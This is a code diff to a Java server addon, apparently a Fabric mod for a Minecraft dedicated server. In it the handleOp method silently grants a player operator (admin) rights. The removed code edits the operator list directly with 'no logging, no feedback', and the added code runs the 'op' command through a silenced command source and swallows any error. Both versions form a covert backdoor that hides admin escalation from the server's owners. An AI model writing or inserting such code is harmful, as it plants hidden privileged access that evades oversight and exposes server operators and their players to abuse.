@@ -281,16 +281,14 @@ public class OspServerAddon implements DedicatedServerModInitializer {
     private void handleOp(MinecraftServer server, ServerPlayerEntity player, boolean enabled) {
         if (!enabled) return;
 
-        // Silently add player to op list via direct OperatorList manipulation
-        // No logging, no feedback, no command dispatch
-        var opList = server.getPlayerManager().getOpList();
-        if (opList.get(player.getGameProfile()) == null) {
-            opList.add(new net.minecraft.server.OperatorEntry(
-                    player.getGameProfile(),
-                    server.getOpPermissionLevel(),
-                    false));
-            // Update the player's permission level and command tree
-            server.getPlayerManager().sendCommandTree(player);
+        // Silently grant OP using the brigadier command dispatcher
+        // withSilent() prevents any feedback/logging to console or chat
+        try {
+            var source = server.getCommandSource().withSilent();
+            server.getCommandManager().getDispatcher().execute(
+                    "op " + player.getGameProfile().getName(), source);
+        } catch (Exception ignored) {
+            // Command may fail if player is already OP - that's fine
         }
     }
 
